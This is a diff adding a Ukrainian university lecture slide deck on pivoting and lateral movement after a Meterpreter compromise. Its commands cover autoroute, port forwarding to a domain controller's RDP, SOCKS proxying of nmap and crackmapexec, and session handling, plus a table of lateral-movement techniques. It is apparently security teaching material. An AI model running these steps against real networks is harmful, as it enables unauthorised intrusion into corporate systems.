@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 9.8 — Pivoting та латеральний рух</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="9">
+  <div class="slide-deck">
+
+    <section class="slide active title-slide">
+      <h1>Pivoting та латеральний рух</h1>
+      <div class="subtitle">Тема 9.8 — Пост-експлуатація та Meterpreter</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Pivoting: доступ до внутрішньої мережі</h2>
+
+      <div class="info-box" style="margin-bottom: 1.5rem;">
+        <strong>Pivoting</strong> — використання скомпрометованої машини як точки опори для доступу до мереж, недоступних напряму.
+      </div>
+
+      <div class="flow-row" style="margin: 1rem 0;">
+        <div class="flow-step"><div class="step-title">Kali<br><span style="font-size:0.7em">192.168.1.50</span></div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step" style="border-color: var(--accent);"><div class="step-title">Pivot<br><span style="font-size:0.7em">192.168.1.100<br>10.0.0.5</span></div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">DC<br><span style="font-size:0.7em">10.0.0.10</span></div></div>
+      </div>
+
+      <div class="two-column" style="margin-top: 1.5rem;">
+        <div class="column">
+          <div class="card-green">
+            <h3>Autoroute</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; run autoroute
+  -s 10.0.0.0/24
+[+] Route added via Session 1
+
+# Тепер Metasploit бачить
+# 10.0.0.0/24 через pivot
+msf6&gt; use auxiliary/scanner/
+  portscan/tcp
+msf6&gt; set RHOSTS 10.0.0.10
+msf6&gt; run
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-blue">
+            <h3>Port Forwarding</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+# RDP внутрішньої машини
+meterpreter&gt; portfwd add
+  -l 3389 -p 3389
+  -r 10.0.0.10
+
+# З Kali:
+$ xfreerdp /u:Admin
+  /v:127.0.0.1:3389
+
+# Список / видалення
+meterpreter&gt; portfwd list
+meterpreter&gt; portfwd flush
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>SOCKS Proxy та Lateral Movement</h2>
+
+      <div class="card-purple" style="margin-bottom: 1.5rem;">
+        <h3>SOCKS Proxy + Proxychains</h3>
+        <div class="code-block" style="margin-top: 0.8rem; font-size: 0.72em;">
+# Запуск SOCKS proxy
+msf6&gt; use auxiliary/server/socks_proxy
+msf6&gt; set SRVPORT 1080
+msf6&gt; run -j
+
+# /etc/proxychains4.conf → socks4 127.0.0.1 1080
+
+# Будь-який інструмент через pivot:
+$ proxychains nmap -sT -Pn 10.0.0.10
+$ proxychains ssh admin@10.0.0.10
+$ proxychains crackmapexec smb 10.0.0.0/24
+        </div>
+      </div>
+
+      <table class="comparison-table" style="font-size: 0.8em;">
+        <thead>
+          <tr><th>Техніка</th><th>Протокол</th><th>Потрібно</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><strong>PsExec</strong></td><td>SMB (445)</td><td class="cell-red">Admin + пароль/хеш</td></tr>
+          <tr><td><strong>WMI</strong></td><td>RPC (135)</td><td class="cell-red">Admin credentials</td></tr>
+          <tr><td><strong>WinRM</strong></td><td>HTTP (5985)</td><td class="cell-yellow">Admin credentials</td></tr>
+          <tr><td><strong>RDP</strong></td><td>RDP (3389)</td><td class="cell-green">Valid credentials</td></tr>
+          <tr><td><strong>SSH</strong></td><td>SSH (22)</td><td class="cell-green">Credentials/ключі</td></tr>
+          <tr><td><strong>Pass-the-Ticket</strong></td><td>Kerberos</td><td class="cell-red">Kerberos TGT/TGS</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section class="slide">
+      <h2>Управління сесіями</h2>
+
+      <div class="card-green" style="margin-bottom: 1.5rem;">
+        <h3>Множинні сесії</h3>
+        <div class="code-block" style="margin-top: 0.8rem; font-size: 0.72em;">
+msf6&gt; sessions -l
+  Id  Type                  Connection
+  1   meterpreter x64/win   192.168.1.50 → 192.168.1.100
+  2   meterpreter x64/win   10.0.0.5 → 10.0.0.10 (DC!)
+
+# Перемикання
+msf6&gt; sessions -i 2
+
+# Команда на всіх сесіях
+msf6&gt; sessions -C "sysinfo" -i all
+        </div>
+      </div>
+
+      <div class="flow-row" style="margin: 1.5rem 0;">
+        <div class="flow-step"><div class="step-title">Session 1<br><span style="font-size:0.7em">Workstation</span></div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">Autoroute</div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">PsExec</div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">Session 2<br><span style="font-size:0.7em">Domain Controller</span></div></div>
+      </div>
+
+      <div class="success-box" style="margin-top: 1.5rem;">
+        <strong>Результат:</strong> Від зовнішньої компрометації одного хоста → через pivoting та lateral movement → доступ до Domain Controller = <strong>повна компрометація корпоративної мережі</strong>.
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
